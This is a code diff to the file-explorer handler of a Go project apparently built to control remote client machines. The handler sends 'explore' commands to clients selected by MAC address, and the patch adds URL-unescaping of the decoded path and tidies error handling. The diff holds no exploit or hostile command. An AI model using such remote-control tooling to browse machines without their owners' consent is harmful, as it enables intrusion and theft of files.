@@ -18,6 +18,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/services/payload"
 	"github.com/tiagorlampert/CHAOS/services/user"
 	"net/http"
+	"net/url"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -276,7 +277,12 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	path, err := utils.DecodeBase64(req.Path)
+	decodedPath, err := utils.DecodeBase64(req.Path)
+	if err != nil {
+		c.String(http.StatusBadRequest, err.Error())
+		return
+	}
+	path, err := url.QueryUnescape(decodedPath)
 	if err != nil {
 		c.String(http.StatusBadRequest, err.Error())
 		return
@@ -285,7 +291,7 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
 	defer cancel()
 
-	payload, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
+	command, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
 		MacAddress: req.Address,
 		Request:    fmt.Sprint("explore ", path),
 	})
@@ -295,8 +301,7 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 	}
 
 	var fileExplorer entities.FileExplorer
-	err = json.Unmarshal(utils.StringToByte(payload.Response), &fileExplorer)
-	if err != nil {
+	if err := json.Unmarshal(utils.StringToByte(command.Response), &fileExplorer); err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
